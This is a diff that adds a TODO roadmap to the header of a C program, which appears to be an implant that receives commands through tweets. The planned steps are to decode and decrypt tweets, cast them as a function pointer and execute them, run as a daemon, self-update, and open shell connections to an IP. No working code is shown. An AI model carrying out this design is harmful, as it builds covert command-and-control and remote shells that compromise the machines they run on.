@@ -6,6 +6,25 @@
  * Compile with:
  *
  * gcc -o get get.c -loauth -lcurl
+ *
+ * @TODO:
+ * (In Progress) Pull latest tweets from a twitter feed
+ *    (/) Hit Twitter API
+ *    (/) Store CURL results in memory
+ *    (/) Use environment variables for credentials
+ *    (*) Save Base64 endoced bodies only into memory
+ * (*) Base64 decode tweet
+ * (*) Decode tweet... Choose cipher
+ * (*) Cast as function pointer and execute
+ * (*) Schedule on a cadence
+ * (*) Run as a daemon
+ * (*) Update binary
+ * (*) Initiate shell connection to IP
+ * (*) Devise way to spin off connections to each client
+ * (*) Keep state of last action performed
+ * (*) Replace libcurl with pure socket IO
+ * (*) Statically link liboauth
+ * (*) Replace liboauth with pure c?
  **/
 
 #include <stdlib.h>
